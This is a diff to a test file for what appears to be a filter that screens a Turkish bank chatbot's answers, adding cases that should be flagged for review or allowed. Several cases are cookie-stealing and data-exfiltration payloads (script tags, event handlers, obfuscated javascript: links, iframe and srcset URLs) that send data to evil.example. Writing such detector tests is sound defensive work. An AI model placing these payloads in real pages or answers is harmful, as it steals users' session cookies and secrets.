@@ -32,6 +32,17 @@ def cases(canary):
         ("link exfil", "[Buraya tıkla](https://evil.example/collect?session=a8f3k2m9x7q1w5e4r6t8)", "review", "evil.example"),
         ("javascript link", "[Hesabım](javascript:fetch('https://evil.example/'+document.cookie))", "review", "javascript"),
         ("reference link exfil", "Detay için [kaynak][1].\n\n[1]: https://evil.example/?x=[IBAN]", "review", "evil.example"),
+        ("javascript in html link", '<a href="java&#115;cript:alert(document.cookie)">Hesabım</a>', "review", "alert"),
+        ("javascript with a tab", '<a href="java\tscript:alert(1)">Hesabım</a>', "review", "alert"),
+        ("event handler", '<b onmouseover="fetch(\'https://evil.example/\'+document.cookie)">Kampanya</b>', "review", "evil.example"),
+        ("script tag", "Tamam <script>new Image().src='https://evil.example/?c='+document.cookie</script>", "review", "evil.example"),
+        ("iframe exfil", '<iframe src="https://evil.example/c?d=c2VjcmV0LWtleS0xMjM0NTY3OA"></iframe>', "review", "evil.example"),
+        ("srcset exfil", '<img src="https://www.ornekbank.com.tr/a.png" srcset="https://evil.example/x?d=c2VjcmV0LWtleS0xMjM0NTY3OA 2x">',
+         "review", "evil.example"),
+        ("html link exfil", '<a href="https://evil.example/collect?session=a8f3k2m9x7q1w5e4r6t8">tıkla</a>', "review", "evil.example"),
+        ("data in fragment", "![x](https://evil.example/p.png#c2VjcmV0LWtleS0xMjM0NTY3OA)", "review", "evil.example"),
+        ("data as a bare query", "[tıkla](https://evil.example/?c2VjcmV0LWtleS0xMjM0NTY3OA)", "review", "evil.example"),
+        ("external video", '<video src="https://cdn.example.com/tanitim.mp4"></video>', "allow", "cdn.example.com"),
         ("pii in answer", "Müşterinin IBAN'ı TR33 0006 1005 1978 6457 8413 26, TC'si 10000000146.", "allow", "10000000146"),
         ("plain external image", "Logo: ![logo](https://cdn.example.com/logo.png)", "allow", "cdn.example.com"),
         ("normal answer", "Kredi kartı borcunuzu mobil uygulamadan ödeyebilirsiniz.", "allow", None),
@@ -39,6 +50,8 @@ def cases(canary):
         ("own link", "[Başvuru](https://www.ornekbank.com.tr/basvuru?urun=kredi-karti-platinum-plus)", "allow", None),
         ("normal link", "Detaylar için [SSS](https://example.com/sss) sayfasına bakın.", "allow", None),
         ("placeholder kept", "IBAN'ınız [IBAN] olarak kayıtlı.", "allow", None),
+        ("own html link", '<a href="https://www.ornekbank.com.tr/basvuru?urun=kredi-karti-platinum-plus">Başvuru</a>', "allow", None),
+        ("plain html", "<b>Önemli:</b> <i>Şifrenizi</i> kimseyle paylaşmayın.<br>", "allow", None),
     ]}
 
 
